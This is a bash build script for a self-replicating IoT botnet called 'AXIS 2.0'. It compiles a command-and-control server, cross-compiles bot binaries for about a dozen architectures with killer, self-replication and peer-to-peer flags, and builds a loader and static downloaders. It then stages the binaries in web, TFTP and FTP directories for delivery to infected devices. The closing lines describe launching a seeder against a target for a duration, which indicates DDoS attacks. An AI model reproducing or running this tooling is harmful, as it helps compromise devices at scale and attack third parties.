#!/bin/bash

echo "AXIS 2.0 Build"
echo "=============="
echo ""

export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$GOROOT/bin:$PATH

declare -A ARCH_CC=(
    ["arm"]="arm-linux-gnueabi-gcc"
    ["arm5"]="arm-linux-gnueabi-gcc"
    ["arm6"]="arm-linux-gnueabihf-gcc"
    ["arm7"]="arm-linux-gnueabihf-gcc"
    ["mips"]="mips-linux-gnu-gcc"
    ["mpsl"]="mipsel-linux-gnu-gcc"
    ["x86"]="i686-linux-gnu-gcc"
    ["x86_64"]="x86_64-linux-gnu-gcc"
    ["ppc"]="powerpc-linux-gnu-gcc"
    ["spc"]="sparc-linux-gnu-gcc"
    ["m68k"]="m68k-linux-gnu-gcc"
    ["sh4"]="sh4-linux-gnu-gcc"
    ["arc"]="arc-linux-gnu-gcc"
)

mkdir -p bins /var/www/html/bins /var/lib/tftpboot /var/ftp logs

echo "[*] Building C&C..."
cd cnc
go mod init production-cnc 2>/dev/null
go get github.com/go-sql-driver/mysql 2>/dev/null
go get github.com/mattn/go-shellwords 2>/dev/null
go build -o ../cnc_server . 2>/dev/null && echo "[+] C&C built" || echo "[-] C&C failed"
cd ..

echo ""
echo "[*] Building bots..."

BOT_FLAGS="-DKILLER -DSELFREP -DP2P_ENABLED=1"

for arch in "${!ARCH_CC[@]}"; do
    CC="${ARCH_CC[$arch]}"
    echo -n "  $arch: "
    
    if command -v $CC &> /dev/null; then
        if $CC -std=gnu99 $BOT_FLAGS -Os -o "bins/axis.$arch" bot/*.c 2>/dev/null; then
            strip "bins/axis.$arch" 2>/dev/null
            cp "bins/axis.$arch" /var/www/html/bins/ 2>/dev/null
            cp "bins/axis.$arch" /var/lib/tftpboot/ 2>/dev/null
            cp "bins/axis.$arch" /var/ftp/ 2>/dev/null
            echo "OK"
        else
            echo "FAIL"
        fi
    else
        echo "SKIP (no compiler)"
    fi
done

echo ""
echo "[*] Building loader..."
cd loader
gcc -std=gnu99 -O3 -o ../loader *.c -lpthread 2>/dev/null && echo "[+] Loader built" || echo "[-] Loader failed"
cd ..

echo ""
echo "[*] Building DLRs..."
cd dlr
for arch in "${!ARCH_CC[@]}"; do
    CC="${ARCH_CC[$arch]}"
    echo -n "  $arch: "
    if command -v $CC &> /dev/null; then
        if $CC -std=gnu99 -Os -static -nostdlib -o "../bins/dlr.$arch" main.c 2>/dev/null; then
            strip "../bins/dlr.$arch" 2>/dev/null
            cp "../bins/dlr.$arch" /var/www/html/bins/ 2>/dev/null
            echo "OK"
        else
            echo "FAIL"
        fi
    fi
done
cd ..

chmod +x cnc_server loader 2>/dev/null
chmod 777 bins/* 2>/dev/null

echo ""
echo "[*] Building P2P Seeder..."
cd seeder
go mod init seeder 2>/dev/null
go build -o ../seeder_server . 2>/dev/null && echo "[+] Seeder built" || echo "[-] Seeder failed"
cd ..

echo ""
echo "Done."
echo ""
echo "Binaries: ./bins/"
echo "Run: ./cnc_server && ./loader"
echo "Seeder: ./seeder_server <method> <target> <duration>"
